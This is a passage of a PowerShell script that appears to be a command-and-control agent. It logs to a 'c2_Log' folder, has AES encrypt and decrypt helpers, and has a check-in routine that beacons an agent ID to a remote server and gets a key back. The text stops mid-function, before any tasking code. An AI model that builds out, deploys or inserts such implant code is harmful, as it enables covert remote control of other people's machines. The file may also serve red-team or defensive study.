######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################


$LogDir = "C:\c2_Log"
$LogFile = "$LogDir\logfile.txt"
$AgentIDFile = "$LogDir\AgentID.txt"

Function Log-Message {
    param (
        [string]$Message
    )
    if (-not (Test-Path -Path $LogDir)) {
        New-Item -Path $LogDir -ItemType Directory
    }
    $Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
    $LogEntry = "$Timestamp - $Message"
    Add-Content -Path $LogFile -Value $LogEntry
}

Function Get-EncryptionKey {
    param ([string]$Base64Key)
    Log-Message "Getting encryption key from Base64 string: $Base64Key"

    try {
        $KeyBytes = [System.Convert]::FromBase64String($Base64Key)
    } catch {
        Log-Message "Error converting Base64 string to byte array: $_"
        throw "Invalid key format."
    }

    if ($KeyBytes.Length -ne 16 -and $KeyBytes.Length -ne 32) {
        throw "Invalid key size. Expected 128-bit (16 bytes) or 256-bit (32 bytes)."
    }
    Log-Message "Encryption key obtained successfully."
    return $KeyBytes
}

Function Encrypt-Data {
    param (
        [string]$Data,
        [byte[]]$Key
    )
    try {
        Log-Message "Starting encryption..."
        $Aes = [System.Security.Cryptography.AesManaged]::new()
        $Aes.Key = $Key
        $Aes.GenerateIV()
        $Encryptor = $Aes.CreateEncryptor($Aes.Key, $Aes.IV)

        $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
        $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)

        Log-Message "Data encrypted successfully."
        return $Aes.IV + $EncryptedBytes  # Raw binary output
    } catch {
        Log-Message "Error in Encrypt-Data: $_"
        throw
    }
}

Function Decrypt-Data {
    param (
        [byte[]]$Data,
        [byte[]]$Key
    )
    try {
        Log-Message "Starting decryption..."
        $Aes = [System.Security.Cryptography.AesManaged]::new()
        $Aes.Key = $Key
        $IV = $Data[0..15]
        $EncryptedBytes = $Data[16..($Data.Length - 1)]

        $Decryptor = $Aes.CreateDecryptor($Aes.Key, $IV)
        $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)

        Log-Message "Data decrypted successfully."
        return [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
    } catch {
        Log-Message "Error in Decrypt-Data: $_"
        throw
    }
}

Function Check-In {
    param (
        [string]$ServerURL,
        [string]$AgentID,
        [byte[]]$Key
    )
    try {
        Log-Message "Starting check-in process..."
        $Body = @{ AgentID = $AgentID } | ConvertTo-Json
        Log-Message "Sending check-in request to $ServerURL"
        $Response = Invoke-RestMethod -Uri "$ServerURL/checkin" -Method Post -Body $Body -ContentType "application/json"
        Log-Message "Received check-in response: $($Response | ConvertTo-Json -Depth 100)"

        if ($null -eq $Response.key -or [string]::IsNullOrEmpty($Response.key)) {
            throw "Received empty HexKey from server."
        }

        $Base64Key = $Response.key
        Log-Message "Received Base64Key: $Base64Key"

        $Key = Get-EncryptionKey -Base64Key $Base64Key
        Log-Message "Encryption key obtained."

        return $Key, $Response
